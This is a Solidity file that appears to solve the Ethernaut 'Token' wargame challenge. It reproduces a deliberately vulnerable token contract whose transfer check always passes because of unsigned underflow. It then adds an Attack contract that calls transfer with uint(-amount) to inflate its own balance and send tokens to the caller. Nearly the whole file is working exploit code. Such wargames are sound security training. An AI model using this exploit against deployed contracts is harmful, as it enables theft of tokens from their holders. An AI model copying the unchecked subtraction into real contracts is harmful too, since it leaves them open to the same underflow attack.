// SPDX-License-Identifier: MIT
/*
  Solution of Token challenge in Ethernaut by utilizing uint256 underflow
*/

pragma solidity 0.6.12;

contract Token {
  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract Attack {
    Token token;

    constructor(address _token) public {
        token = Token(_token);
    }

    function increaseBalance(uint amount) external {
        token.transfer(address(0), uint(-amount));
        token.transfer(msg.sender, amount);
    }

}
